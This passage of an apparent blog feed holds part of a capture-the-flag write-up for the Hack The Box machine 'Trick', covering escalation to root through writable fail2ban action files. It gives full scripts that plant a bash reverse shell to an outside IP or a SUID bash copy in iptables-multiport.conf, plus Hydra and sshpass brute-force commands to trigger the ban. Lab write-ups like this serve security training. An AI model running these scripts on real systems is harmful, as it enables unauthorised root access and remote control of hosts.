+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>michael<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>michael<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>michael<span style="color:#f92672">)</span>,1002<span style="color:#f92672">(</span>security<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>michael@trick:~$ cat user.txt
+</span></span><span style="display:flex;"><span>043**************************bda
+</span></span></code></pre></div><h2 id="post-enumeration">Post Enumeration</h2>
+<p>I can see that <em>michael</em> is part of <em>security</em> group (using <code>id</code> command), and if I run <code>sudo -l</code> I get the following results:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>michael@trick:~$ sudo -l
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> michael on trick:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User michael may run the following commands on trick:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /etc/init.d/fail2ban restart
+</span></span></code></pre></div><p>User <em>michael</em> can restart <a href="https://www.fail2ban.org/wiki/index.php/Main_Page"><em>fail2ban</em></a> service, which is a service that monitors log files for certain services like apache and SSH looking for any sign of bruteforce and blocks the corresponding IP address.
+In addition, if I search for files owned by <em>security</em> group:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>michael@trick:~$ find / -group security 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>/etc/fail2ban/action.d
+</span></span></code></pre></div><p>I can see that <em>action.d</em> directory of <a href="https://www.fail2ban.org/wiki/index.php/Main_Page"><em>fail2ban</em></a> service is owned by security group, so I might be able to abuse this for privilege escalation to root.</p>
+<h2 id="getting-root">Getting root</h2>
+<ul>
+<li>References:
+<ul>
+<li>How fail2ban exactly works (config files &hellip;): <a href="https://www.digitalocean.com/community/tutorials/how-fail2ban-works-to-protect-services-on-a-linux-server">https://www.digitalocean.com/community/tutorials/how-fail2ban-works-to-protect-services-on-a-linux-server</a></li>
+<li><em>Abuse</em> write permission to files inside <em>action.d</em> folder: <a href="https://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/">https://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/</a></li>
+</ul>
+</li>
+</ul>
+<p>Even though I have write permission on <em>action.d</em> directory, I do not have write permission to any file inside it, which means that I cannot override any file, however I can <em>create</em> and <em>move</em> files around (or better said <em>rename</em> files).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>michael@trick:/etc/fail2ban/action.d$ ls -la
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">288</span>
+</span></span><span style="display:flex;"><span>drwxrwx--- <span style="color:#ae81ff">2</span> root security  <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">28</span> 18:21 .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">6</span> root root      <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">28</span> 18:21 ..
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> root root      <span style="color:#ae81ff">3879</span> Oct <span style="color:#ae81ff">28</span> 18:21 abuseipdb.conf
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> root root       <span style="color:#ae81ff">587</span> Oct <span style="color:#ae81ff">28</span> 18:21 apf.conf
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> root root      <span style="color:#ae81ff">1045</span> Oct <span style="color:#ae81ff">28</span> 18:21 ufw.conf
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> root root      <span style="color:#ae81ff">6082</span> Oct <span style="color:#ae81ff">28</span> 18:21 xarf-login-attack.conf
+</span></span></code></pre></div><ul>
+<li>Files are only <em>writable</em> by root.</li>
+</ul>
+<p>From the jail configuration file (<em>/etc/fail2ban/jail.conf</em>), I can see:</p>
+<pre tabindex="0"><code>...
+bantime  = 10s
+...
+findtime  = 10s
+...
+maxretry = 5
+...
+banaction = iptables-multiport
+...
+</code></pre><p>Which means that the <em>ban action</em> will be triggered upon <em>5 unsuccessful login within 10 seconds</em> and will last for 10 seconds. And the file responsible for the ban action is <em>iptables-multiport.conf</em> (will get <em>executed</em> when <em>bruteforce</em> is detected).</p>
+<p>So:</p>
+<ul>
+<li>I can <em>rename</em> the orginal file to <em>iptables-multiport.conf.bak</em> and <em>create</em> a new file that has the <em>same name and contents</em> in addition to my malicious code.</li>
+<li>Change the permission of the file to be executable.</li>
+<li>Then restart the service with <em>sudo</em> permission.</li>
+<li>Finally trigger the ban action using <a href="https://github.com/vanhauser-thc/thc-hydra"><em>Hydra</em></a> or any other tool for bruteforcing.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>michael@trick:~$ cat pwn_reverse_shell.sh 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 1. rename the file</span>
+</span></span><span style="display:flex;"><span>mv /etc/fail2ban/action.d/iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf.bak
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 2. substitute the word `actionban` from the config file with `actionban = bash -c &#34;bash -i&gt;&amp; /dev/tcp/10.10.16.59/8989 0&gt;&amp;1&#34; \n#` to get a reverse shell</span>
+</span></span><span style="display:flex;"><span>sed <span style="color:#e6db74">&#39;s/actionban/actionban = bash -c &#34;bash -i&gt;\&amp; \/dev\/tcp\/10.10.16.59\/8989 0&gt;\&amp;1&#34; \n#/&#39;</span> /etc/fail2ban/action.d/iptables-multiport.conf.bak &gt; /etc/fail2ban/action.d/iptables-multiport.conf
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 3. make the file executable and restart fail2ban service</span>
+</span></span><span style="display:flex;"><span>chmod +x /etc/fail2ban/action.d/iptables-multiport.conf
+</span></span><span style="display:flex;"><span>sudo /etc/init.d/fail2ban restart
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>michael@trick:~$ cat pwn_SUID.sh 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 1. rename the file</span>
+</span></span><span style="display:flex;"><span>mv /etc/fail2ban/action.d/iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf.bak
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 2. substitute the word `actionban` from the config file with `actionban = cp /bin/bash /tmp/newbash &amp;&amp; chmod u+s /tmp/newbash \n#` to get a new SUID bash executable in /tmp/ directory</span>
+</span></span><span style="display:flex;"><span>sed <span style="color:#e6db74">&#39;s/actionban/actionban = cp \/bin\/bash \/tmp\/newbash \&amp;\&amp; chmod u+s \/tmp\/newbash \n#/&#39;</span> /etc/fail2ban/action.d/iptables-multiport.conf.bak &gt; /etc/fail2ban/action.d/iptables-multiport.conf
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 3. make the file executable and restart fail2ban service</span>
+</span></span><span style="display:flex;"><span>chmod +x /etc/fail2ban/action.d/iptables-multiport.conf
+</span></span><span style="display:flex;"><span>sudo /etc/init.d/fail2ban restart
+</span></span></code></pre></div><p>I can either get a reverse shell or make a new <em>bash</em> executable as <em>SUID</em>.</p>
+<ul>
+<li>
+<p>Bruteforce using <a href="https://github.com/vanhauser-thc/thc-hydra"><em>Hydra</em></a>:</p>
+<ul>
+<li><code>hydra -l root -P /usr/share/wordlists/rockyou.txt trick.htb ssh -t 6 -vvv</code></li>
+</ul>
+</li>
+<li>
+<p>Bruteforce using <a href="https://github.com/kevinburke/sshpass"><em>SSHPass</em></a></p>
+<ul>
+<li><code>for i in {1..10}; do  time sshpass -p &quot;test&quot; ssh root@trick.htb; done</code></li>
+</ul>
+</li>
+</ul>
+<p><img src="getting_root.png" alt="Getting root"></p>
+]]></content>
+        </item>
         
         <item>
             <title>Faculty</title>
